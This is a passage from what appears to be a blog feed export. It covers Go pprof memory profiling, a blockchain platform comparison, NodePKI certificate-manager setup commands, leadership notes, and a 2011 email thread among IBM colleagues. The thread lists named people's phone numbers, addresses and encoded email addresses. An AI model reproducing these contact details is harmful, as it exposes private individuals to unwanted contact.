<p>pprof 包预先定义了（还可以自己扩展）4 种快照模式：</p>
<ul>
<li>goroutine，当前所有 goroutines 的 stack traces</li>
<li>heap，所有的堆内存分配（为降低开销仅获取一个近似值，To reduce overhead, the memory profiler only records information for approximately one block per half megabyte allocated (the “1-in-524288 sampling rate”), so these are approximations to the actual counts）</li>
<li>threadcreate，致使新系统线程创建的 stack traces</li>
<li>block，致使在同步原语上阻塞的 stack traces</li>
</ul>
<p>相关 API 具体用法如下：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="comment">// 根据名字查找 Profile</span></span><br><span class="line"><span class="number">2</span> p := pprof.Lookup(<span class="string">&quot;heap&quot;</span>)</span><br><span class="line"><span class="number">3</span> <span class="comment">// 将一个 pprof（程序）格式的快照写入 w</span></span><br><span class="line"><span class="number">4</span> p.WriteTo(w, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>这里的 WriteTo 方法原型为：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">func</span> <span class="params">(p *Profile)</span> <span class="title">WriteTo</span><span class="params">(w io.Writer, debug <span class="keyword">int</span>)</span> <span class="title">error</span></span></span><br></pre></td></tr></table></figure>

<p>其中 debug 参数：</p>
<ul>
<li>为 0 时，仅仅输出 pprof（程序）需要的十六进制地址</li>
<li>为 1 时，输出时增加函数名和行号，这样无需工具也可以阅读此 profile</li>
<li>为 2 时，并且当输出 goroutine profile 时，输出的 goroutine 栈的格式为未 recovered panic 时的格式</li>
</ul>
<h4 id="memory-profiling"><a href="#memory-profiling" class="headerlink" title="memory profiling"></a>memory profiling</h4><p>以 <a href="https://blog.golang.org/profiling-go-programs">https://blog.golang.org/profiling-go-programs</a> 中的例子为例：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="comment">// 定义 flag memprofile</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">var</span> memprofile = flag.String(<span class="string">&quot;memprofile&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;write memory profile to this file&quot;</span>)</span><br><span class="line"><span class="number">3</span> ...</span><br><span class="line"><span class="number">4</span>    <span class="comment">// 需要 profiling 的函数</span></span><br><span class="line"><span class="number">5</span>    FindHavlakLoops(cfgraph, lsgraph)</span><br><span class="line"><span class="number">6</span>    <span class="keyword">if</span> *memprofile != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line"><span class="number">7</span>        f, err := os.Create(*memprofile)</span><br><span class="line"><span class="number">8</span>        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="number">9</span>            log.Fatal(err)</span><br><span class="line"><span class="number">10</span>        &#125;</span><br><span class="line"><span class="number">11</span>        <span class="comment">// WriteHeapProfile 等价于 Lookup(&quot;heap&quot;).WriteTo(w, 0)</span></span><br><span class="line"><span class="number">12</span>        pprof.WriteHeapProfile(f)</span><br><span class="line"><span class="number">13</span>        <span class="comment">// 关闭文件</span></span><br><span class="line"><span class="number">14</span>        f.Close()</span><br><span class="line"><span class="number">15</span>        <span class="keyword">return</span></span><br><span class="line"><span class="number">16</span>    &#125;</span><br></pre></td></tr></table></figure>

<p>使用 go tool pprof 程序打开生成的 profile 文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1 (pprof) top5</span><br><span class="line">2 Total: 82.4 MB</span><br><span class="line">3    56.3  68.4%  68.4%     56.3  68.4% main.FindLoops</span><br><span class="line">4    17.6  21.3%  89.7%     17.6  21.3% main.(*CFG).CreateNode</span><br><span class="line">5     8.0   9.7%  99.4%     25.6  31.0% main.NewBasicBlockEdge</span><br><span class="line">6     0.5   0.6% 100.0%      0.5   0.6% itab</span><br><span class="line">7     0.0   0.0% 100.0%      0.5   0.6% fmt.init</span><br></pre></td></tr></table></figure>

<p>这里显示了函数当前大致分配的内存。类似 CPU profiling，通过 list 命令查看函数具体的内存分配情况：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1 (pprof) list FindLoops</span><br><span class="line">2 Total: 82.4 MB</span><br><span class="line">3 ROUTINE ====================== main.FindLoops <span class="keyword">in</span> /home/rsc/g/benchgraffiti/havlak/havlak3.go</span><br><span class="line">4   56.3   56.3 Total MB (flat / cumulative)</span><br><span class="line">5...</span><br><span class="line">6    1.9    1.9  268:     nonBackPreds := make([]map[int]bool, size)</span><br><span class="line">7    5.8    5.8  269:     backPreds := make([][]int, size)</span><br><span class="line">8      .      .  270:</span><br><span class="line">9    1.9    1.9  271:     number := make([]int, size)</span><br><span class="line">10   1.9    1.9  272:     header := make([]int, size, size)</span><br><span class="line">11   1.9    1.9  273:     types := make([]int, size, size)</span><br><span class="line">12   1.9    1.9  274:     last := make([]int, size, size)</span><br><span class="line">13   1.9    1.9  275:     nodes := make([]*UnionFindNode, size, size)</span><br><span class="line">14     .      .  276:</span><br><span class="line">15     .      .  277:     <span class="keyword">for</span> i := 0; i &lt; size; i++ &#123;</span><br><span class="line">16   9.5    9.5  278:             nodes[i] = new(UnionFindNode)</span><br><span class="line">17     .      .  279:     &#125;</span><br><span class="line">18...</span><br><span class="line">19     .      .  286:     <span class="keyword">for</span> i, bb := range cfgraph.Blocks &#123;</span><br><span class="line">20     .      .  287:             number[bb.Name] = unvisited</span><br><span class="line">21  29.5   29.5  288:             nonBackPreds[i] = make(map[int]bool)</span><br><span class="line">22     .      .  289:     &#125;</span><br></pre></td></tr></table></figure>

<p>有了这些信息，我们就可以着手进行优化了。</p>
]]></content>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>hyperledger-fabric-vs-Ethereum-vs-Odyssey</title>
    <url>/2019/08/28/hyperledger-fabric-vs-ethereum-vs-odyssey/</url>
    <content><![CDATA[<p>面向产业的区块链需要解决 B2B，B2C，B2B2C场景的完整解决方案。其中包含：</p>
<ul>
<li><p>个人账户&amp;资产管理</p>
</li>
<li><p>节点准入与管理</p>
</li>
<li><p>区块链账本</p>
</li>
<li><p>交易&amp;数据隐私</p>
</li>
<li><p>规模化扩展(跨链)的支持</p>
</li>
</ul>
<p>本人认为以上是区块链特性的硬伤，跨过这样的临界值，才能够大量投入产业应用。至于部署的复杂度，合约的表现力，这些都是程序员可以解决的问题，不构成产业应用的硬伤。</p>
<p><img src="/2019/08/28/hyperledger-fabric-vs-ethereum-vs-odyssey/vs.png"></p>
]]></content>
      <tags>
        <tag>产品设计</tag>
      </tags>
  </entry>
  <entry>
    <title>node编写的PKI工具</title>
    <url>/2021/09/30/node%E7%BC%96%E5%86%99%E7%9A%84PKI%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="nodepki"><a href="#nodepki" class="headerlink" title="nodepki"></a>nodepki</h2><p>aditosoftware/nodepki: NodePKI is a simple NodeJS based PKI manager for small corporate environments. (github.com)](<a href="https://github.com/WillZhuang/nodepki">https://github.com/WillZhuang/nodepki</a>) NodePKI 是一个简单的基于 NodeJS 的 PKI 管理器，适用于小型企业环境。</p>
<h3 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h3><ul>
<li>Linux OS</li>
<li>NodeJS</li>
<li>NPM</li>
<li>OpenSSL</li>
</ul>
<h3 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/aditosoftware/nodepki.git</span><br><span class="line">cd nodepki</span><br><span class="line">npm install  </span><br></pre></td></tr></table></figure>

<h3 id="Configure-NodePKI"><a href="#Configure-NodePKI" class="headerlink" title="Configure NodePKI"></a>Configure NodePKI</h3><p>配置文件的例子有 <code>config.yml.default</code>，将其内容copy至 <code>NodePKI/data/config/config.yml</code>。修改 <code>config.yml</code> 根据你的配置。<code>config.yml</code> 中的密码将用于创建PKI。</p>
<h3 id="Start-API-server"><a href="#Start-API-server" class="headerlink" title="Start API server"></a>Start API server</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node server.js</span><br></pre></td></tr></table></figure>

<p>启动后，CA 文件将在 <code>data/mypki</code> 文件夹内创建。</p>
<h3 id="用户登录接口-API-user-login"><a href="#用户登录接口-API-user-login" class="headerlink" title="用户登录接口 API user login"></a>用户登录接口 API user login</h3><h4 id="Add-new-user"><a href="#Add-new-user" class="headerlink" title="Add new user"></a>Add new user</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node nodepkictl useradd --username user1 --password user1password</span><br></pre></td></tr></table></figure>

<h4 id="Remove-user"><a href="#Remove-user" class="headerlink" title="Remove user"></a>Remove user</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node nodepkictl userdel --username user1</span><br></pre></td></tr></table></figure>

<h4 id="List-all-issued-certificates"><a href="#List-all-issued-certificates" class="headerlink" title="List all issued certificates"></a>List all issued certificates</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Content-type: application/json&quot; -d &#x27;&#123; &quot;data&quot;: &#123; &quot;state&quot;:&quot;all&quot; &#125;, &quot;auth&quot;: &#123; &quot;username&quot;:&quot;thomas&quot;, &quot;password&quot;:&quot;test&quot; &#125; &#125;&#x27; http://localhost:8080/api/v1/certificates/list</span><br></pre></td></tr></table></figure>

<h4 id="Request-certificate-from-CSR"><a href="#Request-certificate-from-CSR" class="headerlink" title="Request certificate from CSR"></a>Request certificate from CSR</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Content-type: application/json&quot; -d &#x27;&#123; &quot;data&quot;: &#123; &quot;applicant&quot;:&quot;Thomas&quot;, &quot;csr&quot;:&quot;---CERTIFICATE SIGNING REQUEST---&quot;, &quot;lifetime&quot;:365, &quot;type&quot;:&quot;server&quot; &#125;, &quot;auth&quot;: &#123; &quot;username&quot;:&quot;thomas&quot;, &quot;password&quot;:&quot;test&quot; &#125; &#125;&#x27; http://localhost:8080/api/v1/certificate/request</span><br></pre></td></tr></table></figure>

<h2 id="利用-nodepki-client-管理你的-PKI"><a href="#利用-nodepki-client-管理你的-PKI" class="headerlink" title="利用 nodepki-client 管理你的 PKI"></a>利用 <a href="https://github.com/WillZhuang/nodepki-client">nodepki-client</a> 管理你的 PKI</h2><p>NodePKI 服务器的简单命令行客户端。</p>
<h3 id="Dependencies"><a href="#Dependencies" class="headerlink" title="Dependencies"></a>Dependencies</h3><ul>
<li>NodeJS</li>
<li>NPM</li>
<li>OpenSSL</li>
</ul>
<h3 id="Setup-1"><a href="#Setup-1" class="headerlink" title="Setup"></a>Setup</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ThomasLeister&#x2F;nodepki-client.git</span><br><span class="line">cd nodepki-client</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<h3 id="Configure"><a href="#Configure" class="headerlink" title="Configure"></a>Configure</h3><p>Copy config.default.yml to config/config.yml and set the settings according to your environment.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node client help            </span><br><span class="line">[07:34:26] Reading config file data/config/config.yml ...</span><br><span class="line">Usage: client &lt;subcommand&gt; [options]</span><br><span class="line"></span><br><span class="line">命令：</span><br><span class="line">  request    Request a new certificate with or without .csr file</span><br><span class="line">  list       List issued certificates</span><br><span class="line">  get        Get issued certificate by serial number</span><br><span class="line">  revoke     Revoke certificate via cert file</span><br><span class="line">  getcacert  Get CA certificate</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">  -h, --help  显示帮助信息                                                [布尔]</span><br></pre></td></tr></table></figure>

<h3 id="创建证书-与私钥"><a href="#创建证书-与私钥" class="headerlink" title="创建证书(与私钥)"></a>创建证书(与私钥)</h3><p>Create new key + certificate from scratch and store both in out/ directory. Lifetime: 7 days.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node client request --lifetime 7 --out out/</span><br></pre></td></tr></table></figure>

<p>Create new key + certificate from scratch, add intermediate cert to cert and store in out/ directory</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node client request --out out/ --fullchain</span><br></pre></td></tr></table></figure>

<p>Lifetime defaults to <em>cert_lifetime_default</em> setting in config.yml</p>
<p>Create a new client certificate:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node client request --type client --out out/</span><br></pre></td></tr></table></figure>

<p>获取发布的证书</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node client list --state all</span><br></pre></td></tr></table></figure>

<p>可用的状态 Valid states:</p>
<ul>
<li>all</li>
<li>valid</li>
<li>expired</li>
<li>revoked</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node client list --state valid</span><br></pre></td></tr></table></figure>

<h3 id="获取证书-Get-certificate-by-serial-number"><a href="#获取证书-Get-certificate-by-serial-number" class="headerlink" title="获取证书 Get certificate by serial number"></a>获取证书 Get certificate by serial number</h3><p>… and store certificate to out/cert.pem</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node client get --serialnumber 324786EA --out out/cert.pem</span><br></pre></td></tr></table></figure>

<h3 id="Revoke-issued-certificate"><a href="#Revoke-issued-certificate" class="headerlink" title="Revoke issued certificate"></a>Revoke issued certificate</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node client revoke --cert cert.pem</span><br></pre></td></tr></table></figure>

<h3 id="Get-CA-certificates"><a href="#Get-CA-certificates" class="headerlink" title="Get CA certificates"></a>Get CA certificates</h3><p>Get root certificate:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node client getcacert --ca root</span><br></pre></td></tr></table></figure>

<p>Write root certificate to file:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node client getcacert --ca root --out out/root.cert.pem</span><br></pre></td></tr></table></figure>

<p>Get intermediate certificate:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node client getcacert --ca intermediate</span><br></pre></td></tr></table></figure>

<p>Get intermediate certificate + root certificate (=cert chain) and write to file:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node client getcacert --ca intermediate --chain --out out/ca-chain.cert.pem</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>leader-and-leadership</title>
    <url>/2019/12/04/leader-and-leadership/</url>
    <content><![CDATA[<p>leader: 率领和引导他人实现组织目标的过程例如，头雁。</p>
<ul>
<li>领导风格-西方提倡模式，Coach型，激发型；东方固有模式，家长式，命令型</li>
<li>(领导中的)导是指什么？引导（指引目标），辅导，教导，督导（检查、督促），疏导（解决矛盾、怨言、冲突）</li>
<li>领导对象-追随者</li>
</ul>
<p>leadership</p>
<ul>
<li>硬权力，岗位的职级，权力是起始点和载体</li>
<li>软权力，品格德行、能力知识、修养才华。当品格德行出现问题时，公信力会出现丧失，说的正确的内容也会被人质疑</li>
</ul>
<p>领导发展趋势</p>
<ul>
<li>简约化、制度化、柔性化(发现追随者的内心，亲近)、隐形化(成功之后，也成自然的状态)</li>
</ul>
<p>领导职能</p>
<ul>
<li>出主意</li>
<li>用干部</li>
</ul>
<p>出主意</p>
<ul>
<li><p>战略思维。长远的、全局的、高层次的重大问题的筹划和思考。全球-全国-上海-金融-保险。</p>
<p>通观全局，抓枢纽，把重点</p>
<p>着眼大局，认清大局，服务大局</p>
<p>科学预见，立足长远，把握大势</p>
</li>
<li><p>创新思维、辩证思维（两点论、重点论、系统论-重大问题要放一放）、韧性、公心</p>
</li>
<li><p>及时决断、敢于担当（通过价值标准，拜托布里丹选择）</p>
</li>
<li><p>决策的三圈理论（价值圈、能力圈、认同圈）</p>
</li>
</ul>
<p>用干部</p>
<ul>
<li><p>授权，多干就是少干、少干才能多干。领导就是服务（环境、平台、制度、支持）</p>
</li>
<li><p>优化团队结构（角色：实干、推动、协调、凝聚、监督、外交、智多、完美主义）</p>
</li>
<li><p>领导激励（满足合理需求、制度设计、物质与精神相结合）</p>
</li>
</ul>
<p>沟通（语言、听、身体）</p>
<ul>
<li>上行，事前请示、事后沟通；目标传递、将目标变成领导的目标</li>
<li>下行，开放、鼓励、公平。不着急说，先听听看</li>
<li>平行，多支持，不埋怨</li>
</ul>
<p>认识自我</p>
<ul>
<li>知己，知命、知长、知短</li>
<li>性格特点、正职副职、信任</li>
<li>不断学习，依靠学习走向未来。70%从实践中学习，20%向同行同事学习，10%从书本中学习。“学哲学，用哲学是我们党的好传统“，“工作上常常干糊涂事、吃糊涂亏、占糊涂便宜”—《学哲学、用哲学》</li>
<li>学历史（国史、党史），学专业知识，学习文学艺术</li>
<li>情绪管理。时间管理28原则，锻炼放松、质朴生活</li>
<li>改变认知。从学习经典中来，从自省（日三省身）&amp;觉知（自我的旁观者，keep focus，做事慢半拍）中来</li>
</ul>
]]></content>
      <tags>
        <tag>leadership</tag>
      </tags>
  </entry>
  <entry>
    <title>one year later</title>
    <url>/2011/11/15/one-year-later/</url>
    <content><![CDATA[<p>==============================================================</p>
<p>Gosh darnit, I miss you guys!</p>
<p>Congrats to everyone with all of the great things that are going on in each of your lives!  I hope things just continue to progress more and more! Happy Birthday to you, Keith!</p>
<p>I’m glad that I’ve had a chance to see Erika and Belen, but since I’ve started a new position where I’m traveling ALL of the time, I’m hoping to be in a city near each of you soon!  </p>
<p>Much love to G5!</p>
<p>Regards,</p>
<p>Regina D. Holley Information Security Advisor and Global ISA Program Lead</p>
<p>  ITD - Security Operations Management</p>
<p>  972.561.6790 [TL:  861.6790]</p>
<p>  <a href="mailto:&#104;&#111;&#108;&#x6c;&#101;&#x79;&#114;&#64;&#x75;&#115;&#x2e;&#105;&#98;&#x6d;&#46;&#99;&#x6f;&#109;">&#104;&#111;&#108;&#x6c;&#101;&#x79;&#114;&#64;&#x75;&#115;&#x2e;&#105;&#98;&#x6d;&#46;&#99;&#x6f;&#109;</a></p>
<p>  “Do not follow the path. Go where there is no path to begin the trail.”</p>
<p>-Ashanti proverb</p>
<p>===============================================================</p>
<p>From: Erika V Quezada/Mexico/IBM@IBMMX</p>
<p>To: Keith M Bantle/Fairfax/IBM@IBMUS</p>
<p>Cc: Srinivas Manem/India/IBM@IBMIN, Belen Martin Lopez/Spain/IBM@IBMES@IBMGB, Wei Ming Zhuang/China/IBM@IBMCN@IBMAU@IBMGB, Anouk Bikkel/Netherlands/IBM@IBMNL, Frederique Tenthoff/UK/IBM@IBMGB, Herbie Pearthree/Raleigh/IBM@IBMUS, Martin Jesko/Slovakia/IBM@IBMSK, Regina D Holley/Dallas/IBM@IBMUS, Roy Hebert/CanWest/IBM@IBMCA</p>
<p>Date: 10/27/2011 01:34 AM</p>
<p>Subject: Re: One year later….</p>
<p>FELIZ CUMPLEAÑOS KEITH!!!</p>
<p>My best wishes to you!  Pls put a picture of Wilson next to your shots.  And drink one wooden boat shot for us =)  Have a great birthday!!</p>
<p>I will be in NYC from friday to wednesday morning for vacation, aren’t you planning to be there for Halloween?  </p>
<p>Srini, are you part of the Acapulco mexican team? If yes you should visit us,  Is the biggest project in Mexico!!</p>
<p>Today, I was chatting with Tina by Facebook and she ask me to say hello to everybody, she is now an expert surffer and still miss all of us.</p>
<p>Kisses!</p>
<p>Saludos,</p>
<p>Erika V. Quezada Ruiz</p>
<p>Sales Manager</p>
<p>Public Sector</p>
<p>IBM de México</p>
<p>Tel. (55) 52703701</p>
<p>Cel. 04455 54551278</p>
<p>===============================================================</p>
<p>From: Keith M Bantle/Fairfax/IBM@IBMUS</p>
<p>To: Srinivas Manem/India/IBM@IBMIN</p>
<p>Cc: Belen Martin Lopez/Spain/IBM@IBMES@IBMGB, Wei Ming Zhuang/China/IBM@IBMCN@IBMAU@IBMGB, Anouk Bikkel/Netherlands/IBM@IBMNL, Erika V Quezada/Mexico/IBM@IBMMX, Frederique Tenthoff/UK/IBM@IBMGB, Herbie Pearthree/Raleigh/IBM@IBMUS, Martin Jesko/Slovakia/IBM@IBMSK, Regina D Holley/Dallas/IBM@IBMUS, Roy Hebert/CanWest/IBM@IBMCA</p>
<p>Date: 26/10/2011 11:57</p>
<p>Subject: Re: One year later….</p>
<p>Yes, all such wonderful memories for all of us!  I still cannot even imagine a better team!</p>
<p>ps- and for the record, I will be using my little wooden boat ‘shooter’ for my birthday shots this evening!</p>
<p>Keith Bantle</p>
<p>IBM Global Business Services</p>
<p>AIS - Application Innovation Services</p>
<p>4401 Belle Oaks Drive, Ashley Center</p>
<p>Charleston, SC 29405</p>
<p>Mobile: 843.860.9174</p>
<p>Fax: 845.432.0121</p>
<p><a href="mailto:&#x6b;&#x62;&#x61;&#110;&#116;&#x6c;&#x65;&#64;&#x75;&#x73;&#x2e;&#105;&#x62;&#x6d;&#46;&#99;&#111;&#x6d;">&#x6b;&#x62;&#x61;&#110;&#116;&#x6c;&#x65;&#64;&#x75;&#x73;&#x2e;&#105;&#x62;&#x6d;&#46;&#99;&#111;&#x6d;</a></p>
<p>===============================================================</p>
<p>From: Srinivas Manem/India/IBM@IBMIN</p>
<p>To: Belen Martin Lopez/Spain/IBM@IBMES@IBMGB, Keith M Bantle/Fairfax/IBM@IBMUS, Wei Ming Zhuang/China/IBM@IBMCN@IBMAU@IBMGB, Anouk Bikkel/Netherlands/IBM@IBMNL, Erika V Quezada/Mexico/IBM@IBMMX, Frederique Tenthoff/UK/IBM@IBMGB, Herbie Pearthree/Raleigh/IBM@IBMUS, Martin Jesko/Slovakia/IBM@IBMSK, Regina D Holley/Dallas/IBM@IBMUS, Roy Hebert/CanWest/IBM@IBMCA</p>
<p>Date: 10/26/2011 12:44 PM</p>
<p>Subject: Re: One year later….</p>
<p>Hi Keith,</p>
<p>Wish you a very happy Birthday..!! Have a great time</p>
<p>It’s already been an year.. The memories are still very fresh in my mind. I really miss all those great days. Last year, this week we were rushing to complete projects &amp; finalizing our presentations.. </p>
<p>Playing golf, eating fufu, early morning monkey search, playing darts, wonderful excursions on the weekends &amp; wonderful team work to complete the projects.. We had so much of fun in just one month time.. </p>
<p>Truly, ours is the BEST TEAM ever..  Wish we’d meet again some day!!</p>
<p>Freddie:  Congratulations on your new house.. :)  Please share some pictures.. </p>
<p>Thanks &amp; Regards, </p>
<p>Srini </p>
<p>Srinivas Manem,</p>
<p>Release Management, Acapulco,</p>
<p>Global Telecom CoC </p>
<p>IBM Global Business Services </p>
<p>Mobile  +91 99497 03030 </p>
<p>Email   <a href="mailto:&#x53;&#x72;&#x69;&#110;&#x69;&#x76;&#x61;&#x73;&#46;&#x4d;&#97;&#x6e;&#101;&#109;&#x40;&#105;&#110;&#x2e;&#x69;&#98;&#x6d;&#x2e;&#x63;&#111;&#109;">&#x53;&#x72;&#x69;&#110;&#x69;&#x76;&#x61;&#x73;&#46;&#x4d;&#97;&#x6e;&#101;&#109;&#x40;&#105;&#110;&#x2e;&#x69;&#98;&#x6d;&#x2e;&#x63;&#111;&#109;</a> </p>
<p>===============================================================</p>
<p>From: Belen Martin Lopez/Spain/IBM@IBMES</p>
<p>To: Wei Ming Zhuang/China/IBM@IBMCN@IBMAU@IBMGB</p>
<p>Cc: Anouk Bikkel/Netherlands/IBM@IBMNL, Erika V Quezada/Mexico/IBM@IBMMX, Frederique Tenthoff/UK/IBM@IBMGB, Herbie Pearthree/Raleigh/IBM@IBMUS, Keith M Bantle/Fairfax/IBM@IBMUS, Martin Jesko/Slovakia/IBM@IBMSK, Regina D Holley/Dallas/IBM@IBMUS, Roy Hebert/CanWest/IBM@IBMCA, Srinivas Manem/India/IBM@IBMIN</p>
<p>Date: 10/26/2011 02:07 PM</p>
<p>Subject: Re: One year later….</p>
<p>I almost forgot,</p>
<p>Happy Birthday Keith!!</p>
<p>Have a great day! Wilson and I miss you!</p>
<p>Saludos/Regards</p>
<p>Belén Martín López</p>
<p>Senior Managing Consultant</p>
<p>Phone: +34 660 413 703 </p>
<p>email: <a href="mailto:&#x62;&#101;&#x6c;&#x65;&#110;&#46;&#109;&#x61;&#114;&#x74;&#105;&#x6e;&#x40;&#x65;&#x73;&#46;&#x69;&#98;&#x6d;&#x2e;&#x63;&#111;&#x6d;">&#x62;&#101;&#x6c;&#x65;&#110;&#46;&#109;&#x61;&#114;&#x74;&#105;&#x6e;&#x40;&#x65;&#x73;&#46;&#x69;&#98;&#x6d;&#x2e;&#x63;&#111;&#x6d;</a> </p>
<p>IBM Global Services España, S.A.</p>
<p>Mar Adriático, 2, 28830 San Fernando de Henares (Madrid)</p>
<p>Registro Mercantil de Madrid, Folio 49; Tomo 6430; Hoja M-104.742</p>
<p>CIF A80-599459 </p>
<p>===============================================================</p>
<p>Wei Ming Zhuang/China/IBM@IBMCN</p>
<p>26/10/2011 10:36 </p>
<p> To</p>
<p> Keith M Bantle/Fairfax/IBM@IBMUS@IBMAU, Regina D Holley/Dallas/IBM@IBMUS</p>
<p> cc</p>
<p> Roy Hebert/CanWest/IBM@IBMCA, Erika V Quezada/Mexico/IBM@IBMMX@IBMUS, Anouk Bikkel/Netherlands/IBM@IBMNL, Belen Martin Lopez/Spain/IBM@IBMES, Frederique Tenthoff/UK/IBM@IBMGB, Herbie Pearthree/Raleigh/IBM@IBMUS, Martin Jesko/Slovakia/IBM@IBMSK, Srinivas Manem/India/IBM@IBMIN</p>
<p> Subject</p>
<p> Re: One year later….</p>
<p>Hi,</p>
<p>I often talk about our G5 experience with friends and others, I do not know why, a lot of things become more clear with the flow at time.</p>
<p>Last week Regina was the most close to me (about 4 hours fly from Dalian to Hong Kong, Taipei). But I am still so happy to know this, just like one guy in island after air crash shouts at the near boat. </p>
<p>Miss all of you. Must be let me if anyone come to Beijing or Dalian. Must!</p>
<p>Have a good working day !</p>
<p>==============================================</p>
<p>庄伟铭/Wei Ming, E-mail: <a href="mailto:&#x7a;&#104;&#117;&#97;&#110;&#103;&#x77;&#x6d;&#x40;&#x63;&#110;&#x2e;&#105;&#98;&#x6d;&#x2e;&#99;&#x6f;&#x6d;">&#x7a;&#104;&#117;&#97;&#110;&#103;&#x77;&#x6d;&#x40;&#x63;&#110;&#x2e;&#105;&#98;&#x6d;&#x2e;&#99;&#x6f;&#x6d;</a></p>
<p>TEL:0411-88151143 Tie-Line:61143 </p>
<p>IBM Dalian Global Delivery Center, GBS/GCG</p>
<p>==============================================</p>
<p>From: Keith M Bantle/Fairfax/IBM@IBMUS</p>
<p>To: Roy Hebert/CanWest/IBM@IBMCA</p>
<p>Cc: Erika V Quezada/Mexico/IBM@IBMMX@IBMUS, Anouk Bikkel/Netherlands/IBM@IBMNL, Belen Martin Lopez/Spain/IBM@IBMES, Frederique Tenthoff/UK/IBM@IBMGB, Herbie Pearthree/Raleigh/IBM@IBMUS, Martin Jesko/Slovakia/IBM@IBMSK, Regina D Holley/Dallas/IBM@IBMUS, Srinivas Manem/India/IBM@IBMIN, Wei Ming Zhuang/China/IBM@IBMCN</p>
<p>Date: 2011-10-26 02:23</p>
<p>Subject: Re: One year later….</p>
<p>Hello, ¡Hola , Hallo, Ello,  Ahoj, 您好,??????, and Top O’ the Mornin’ to Ya (that one is for you, Roy, and I hope the others are correct),</p>
<p>I think we need a G5 summit!  It really is very hard to believe it’s been a year already!  I have been thinking of all of you, especially as the month of October has been passing by, remembering what we were doing ‘that week’.  </p>
<p>It certainly does appear that the girls have been much better about staying in touch and Belen has even come to visit already!  Hopefully she and Carlos enjoyed their stay in Charleston (Savannah and Asheville too), which was still too short.  I must admit that I was tempted to surprise her one day by pounding ‘fufu’ and putting a ball of pizza dough in some tomato soup, although she may have actually preferred that over the real thing.  </p>
<p>Roy, I was disappointed to see the Sabres schedule does not include Calgary this season, but hopefully next year and I promise I will be there.  No excuses!  Bring on the wings and Canadian beer!!</p>
<p>Freddie, congrats on your new house!!  I forgot to tell you about our 3 day Dave Matthews concert in NYC last month- it was awesome!</p>
<p>Erika, thanks for rounding all of us up and glad to hear you are enjoying life!  I miss all of the different candy!</p>
<p>Anouk, hopefully you are doing well and keep us posted on your baby’s arrival!  We’ll have to figure out his or her Ghanaian name and we can always have some of that awful clove porridge I made the mistake of eating early one morning exported to you…</p>
<p>GoG and AB- it was great speaking with both of you earlier today!!</p>
<p>Srini, I hope you’ve continued playing golf… you must be preparing for the PGA already!</p>
<p>Martin, I’m sure you are as glad as I am that the NHL season is underway- hope you have been playing as often as you can!</p>
<p>Herbie, I wonder if you and Anouk have played darts and been able to replicate your double dart achievements?!</p>
<p>Will, every time I see ‘Firefly Sweet Tea Vodka’, I remember you drinking that whole bottle at once!</p>
<p>Hope everyone is doing well and look forward to catching up soon!</p>
<p>Keith</p>
<p>ps- if anyone needs about a lb. or so of shea butter, I still have 98.2% of the container remaining… Belen can attest to that!</p>
<p>Keith Bantle</p>
<p>IBM Global Business Services</p>
<p>AIS - Application Innovation Services</p>
<p>4401 Belle Oaks Drive, Ashley Center</p>
<p>Charleston, SC 29405</p>
<p>Mobile: 843.860.9174</p>
<p>Fax: 845.432.0121</p>
<p><a href="mailto:&#x6b;&#98;&#x61;&#x6e;&#x74;&#108;&#101;&#64;&#117;&#x73;&#46;&#105;&#x62;&#109;&#x2e;&#x63;&#111;&#109;">&#x6b;&#98;&#x61;&#x6e;&#x74;&#108;&#101;&#64;&#117;&#x73;&#46;&#105;&#x62;&#109;&#x2e;&#x63;&#111;&#109;</a></p>
<p>===============================================================</p>
<p>From: Roy Hebert/CanWest/IBM@IBMCA</p>
<p>To: Erika V Quezada/Mexico/IBM@IBMMX@IBMUS</p>
